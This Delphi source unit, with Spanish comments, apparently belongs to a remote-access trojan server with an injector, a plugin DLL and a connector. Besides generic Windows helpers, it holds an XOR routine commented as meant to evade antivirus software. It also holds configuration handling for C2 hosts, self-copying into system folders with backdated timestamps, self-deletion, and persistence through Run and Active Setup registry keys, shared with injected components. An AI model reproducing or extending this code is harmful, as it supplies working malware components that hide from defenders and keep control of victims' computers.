unit Funciones;

interface
uses
  Windows,
  Minireg, //Written by Ben Hochstrasser
  SettingsDef, //Para leer la configuración
  Variables,
  SHfolder,
  TlHelp32;

function Cifrar(Text: AnsiString; i: Integer): AnsiString;
function StrToInt(const s: string): Integer;
function LC(const S: string): string; //Loqer-case: Pasa todo a minúsculas
function FileExists(const FileName: string): Boolean;
function GetProcessID(sProcName: string): Integer; //Obtiene el ID de un proceso por su nombre
function GetBrowser: AnsiString; //Obtiene la ruta al navegador predeterminado
procedure CompartirConfig();
function ExtractFileName(FileName: string): string;
function stringreplace(s1: string; s2: string; s3: string): string;
function FindWindowsDir: string;
function FindSystemDir: string;
function FindTempDir: string;
function FindRootDir: string;
function GetSpecialFolderPath(folder: Integer): string; //appdir
implementation

function FindWindowsDir: string;
//retorna el directorio de windows
var
  DataSize: Byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    begin
      SetLength(Result, DataSize);
      if Result[Length(Result)] <> '\' then
        Result := Result + '\';
    end;
end;

function FindSystemDir: string;
//retorna el directorio de windows
var
  DataSize: Byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    begin
      SetLength(Result, DataSize);
      if Result[Length(Result)] <> '\' then
        Result := Result + '\';
    end;
end;

function FindTempDir: string;
//retorna el directorio de los temporales
var
  DataSize: Byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
    begin
      SetLength(Result, DataSize);
      if Result[Length(Result)] <> '\' then
        Result := Result + '\';
    end;
end;

function FindRootDir: string;
//retorna el root del directorio de windows
var
  DataSize: Byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    Result := Copy(Result, 1, 3);
end;

function GetSpecialFolderPath(folder: Integer): string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array[0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0, folder, 0, SHGFP_TYPE_CURRENT, @path[0])) then
    Result := path
  else
    Result := '';
  if Result[Length(Result)] <> '\' then
    Result := Result + '\';
end;

function stringreplace(s1: string; s2: string; s3: string): string; { (copyto) windir DIR}
begin
  s1 := lc(s1);
  s2 := lc(s2);
  s3 := lc(s3);

  if (Pos(s2, 'a' + s1) - 1) > 0 then
    begin
      Result := s3 + Copy(s1, Length(s2) + 1, Length(s1) - Length(s2));

    end
  else
    Result := s1;

end;

function ExtractFileName(FileName: string): string;
var
  Position: Integer;
begin
  Result := '';
  while True do
    begin
      Position := Pos('\', FileName);
      if Position > 0 then
        Delete(FileName, 1, Position)
      else
        Break;
    end;
  Result := FileName;
end;

function Cifrar(Text: AnsiString; i: Integer): AnsiString;
var
  iloop: Integer;
begin
  for iloop := 1 to Length(Text) do
    Text[iloop] := chr(Ord(Text[iloop]) xor i); //funcion de cifrado simple para evadir antiviruses
  Result := Text;
end;

function StrToInt(const s: string): Integer;
var
  e: Integer;
begin
  val(s, Result, e);
end;

function LC(const S: string): string;
const
  a = 1;
var
  Max, CharNo: Cardinal;
  pResult: PChar;
begin
  Max := Length(S);
  SetLength(Result, Max);
  if Max <= 0 then Exit;
  pResult := PChar(Result);
  CharNo := 0;
  repeat
    pResult[CharNo] := S[CharNo + a];
    if (S[CharNo + a] >= 'A') and (S[CharNo + a] <= 'Z') then
      pResult[CharNo] := char(Ord(S[CharNo + a]) + 32);
    Inc(CharNo);
  until (CharNo >= Max);
end;

function FileExists(const FileName: string): Boolean;
var
  filedata: twin32finddata;
  hfile: Cardinal;
begin
  hfile := findfirstfile(PChar(FileName), filedata);
  if (hfile <> invalid_handle_value) then
    begin
      Result := True;
      windows.findclose(hfile);
    end
  else
    Result := False;
end;

function GetProcessID(sProcName: string): Integer;
var
  hProcSnap: THandle;
  pe32: TProcessEntry32;
begin
  Result := 0;
  hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if hProcSnap = INVALID_HANDLE_VALUE then
    Exit;
  pe32.dwSize := SizeOf(ProcessEntry32);
  if Process32First(hProcSnap, pe32) = True then
    while Process32Next(hProcSnap, pe32) = True do
      if Pos(lc(sProcName), lc(pe32.szExeFile)) > 0 then
        Result := pe32.th32ProcessID;
end;

function getBrowser: AnsiString;
var
  ts: AnsiString;
begin
  RegGetString(HKEY_CLASSES_ROOT, '\htmlfile\shell\open\command\', ts);
  ts := Copy(ts, Pos('"', ts) + 1, Length(ts));
  ts := Copy(ts, 1, Pos('"', ts) - 1);
  Result := ts;
  //ShowMessage('El browser esta en: '+ts);
end;

procedure CompartirConfig();
begin
  if ReadSettings(ConfigLeida) = True then //Leemos la configuración
    begin
      Configuracion.sHosts := ConfigLeida^.sHosts;
      Configuracion.sID := ConfigLeida^.sID;
      Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo;
      Configuracion.sFileNameToCopy := ConfigLeida^.sFileNameToCopy;
      Configuracion.sCopyTo := ConfigLeida^.sCopyTo;
      Configuracion.bCopiarConFechaAnterior := ConfigLeida^.bCopiarConFechaAnterior;
      Configuracion.bMelt := ConfigLeida^.bMelt;
      Configuracion.bArranqueRun := ConfigLeida^.bArranqueRun;
      Configuracion.sRunRegKeyName := ConfigLeida^.sRunRegKeyName;
      Configuracion.sPluginName := ConfigLeida^.sPluginName;
      Configuracion.sActiveSetupKeyName := ConfigLeida^.sActiveSetupKeyName;
      Configuracion.bArranqueActiveSetup := ConfigLeida^.bArranqueActiveSetup;
      Configuracion.snumerocifrado := ConfigLeida^.snumerocifrado;
      Configuracion.snumerocifrado2 := ConfigLeida^.snumerocifrado2;
      Configuracion.bPersistencia := ConfigLeida^.bPersistencia;
    end
  else
    begin
      exitprocess(0); //Debug
      Configuracion.sHosts                        := 'localhost:80¬';
      Configuracion.sID                          := 'id';
      Configuracion.bCopiarArchivo               := false;
      Configuracion.sFileNameToCopy              := 'a.exe';
      Configuracion.sCopyTo                      := 'c:\';
      Configuracion.bCopiarConFechaAnterior      := false;
      Configuracion.bMelt                        := false;
      Configuracion.bArranqueRun                 := false;
      Configuracion.sRunRegKeyName               := 'rkey';
      Configuracion.sPluginName                  := 'a.dll';
      Configuracion.sActiveSetupKeyName          := 's';
      Configuracion.bArranqueActiveSetup         := false;
      Configuracion.snumerocifrado               := '0';
      Configuracion.snumerocifrado2              := '0';
      
    end;

  MCompartida := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(TSettings), 'Config');
  if (MCompartida = 0) then exitprocess(0);
  ConfigCompartida := MapViewOfFile(MCompartida, FILE_MAP_WRITE, 0, 0, 0);
  {Escribimos datos en el fichero de memoria para que Monitor, coolserver.dll y conectador.exe}
  ConfigCompartida^.sHosts := Configuracion.sHosts;
  ConfigCompartida^.sID := Configuracion.sID;
  ConfigCompartida^.bCopiarArchivo := Configuracion.bCopiarArchivo;
  ConfigCompartida^.sFileNameToCopy := Configuracion.sFileNameToCopy;
  ConfigCompartida^.sCopyTo := Configuracion.sCopyTo;
  ConfigCompartida^.bCopiarConFechaAnterior := Configuracion.bCopiarConFechaAnterior;
  ConfigCompartida^.bMelt := Configuracion.bMelt;
  ConfigCompartida^.bArranqueRun := Configuracion.bArranqueRun;
  ConfigCompartida^.sRunRegKeyName := Configuracion.sRunRegKeyName;
  ConfigCompartida^.bArranqueActiveSetup := Configuracion.bArranqueActiveSetup;
  ConfigCompartida^.sActiveSetupKeyName := Configuracion.sActiveSetupKeyName;
  ConfigCompartida^.sPluginName := Configuracion.sPluginName;
  ConfigCompartida^.sInyectadorFile := ParamStr(0); //para informar a conectador.exe donde estoy
  ConfigCompartida^.bPersistencia := Configuracion.bPersistencia;

  //Sustituimos las variables de instalacion posibles
  Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
    '%WinDir%\', FindWindowsDir());
  Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
    '%SysDir%\', FindSystemDir());
  Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
    '%TempDir%\', FindTempDir());
  Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
    '%RootDir%\', FindRootDir());
  Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
    '%AppDir%\', GetSpecialFolderPath($001C));

end;
end.
